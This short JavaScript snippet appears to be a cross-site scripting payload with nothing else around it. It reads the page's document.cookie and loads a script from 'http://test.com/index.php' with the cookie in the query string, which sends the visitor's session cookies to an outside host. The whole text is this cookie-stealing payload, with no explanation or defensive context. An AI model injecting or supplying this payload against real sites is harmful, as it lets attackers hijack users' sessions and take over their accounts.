var c=document.cookie;
var script =document.createElement('script');
script.src='http://test.com/index.php?c='+c;
document.body.appendChild(script);